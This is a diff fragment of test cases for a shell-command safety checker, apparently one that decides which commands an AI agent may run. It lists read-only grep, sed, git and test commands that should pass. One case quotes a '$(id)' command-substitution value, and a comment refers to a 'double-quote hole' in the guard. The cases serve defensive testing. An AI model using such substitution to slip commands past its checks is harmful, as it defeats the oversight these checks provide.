+  // A pattern is not a target — the ops docs this wave reads are full of `ssh`.
+  'cd /x && grep -c "ssh" docs/ops/PROD_OPS.md',
+  "grep -rn 'rsync' docs/ops/",
+  // The line citation the rerun harness's own schema tells producers to write.
+  "git show origin/main:api/lib/barkpark/application.ex | sed -n '40,60p'",
+  "sed -n '866,870p' .claude/workflows/bp-connectors-charter.md",
+  "sed -n '18p' docs/cards/studio.md",
+  "sed -n '/type ChatWorkflowSummary struct/,/^}/p' internal/apiclient/chat.go",
+  "sed -n '82p;98p;130p' api/test/barkpark/search/strength_ranking_test.exs",
+  "sed 's/foo/bar/g' notes.md",
+  "sed -e '1,5p' -e '9q' notes.md",
+  // Single quotes are genuinely inert — refusing these would be the wrong fix
+  // for the double-quote hole.
+  "grep -n '$(id)' .",
+  "grep -n 'x`y`z' .",
+  // The write-flag guards target the FLAG, never the tool.
+  "npm version",
+  "npm config get registry",
+  "go test -cover ./...",
+  "go test ./internal/cli/... -run TestFoo -count=1 -v",
+  "mix test test/barkpark/sites/deploy_runner_test.exs:583",
+  "hostname",
+  "hostname -f",
+  "CC=/usr/bin/clang MIX_ENV=test mix test --seed 111",
 ];
 
 /**
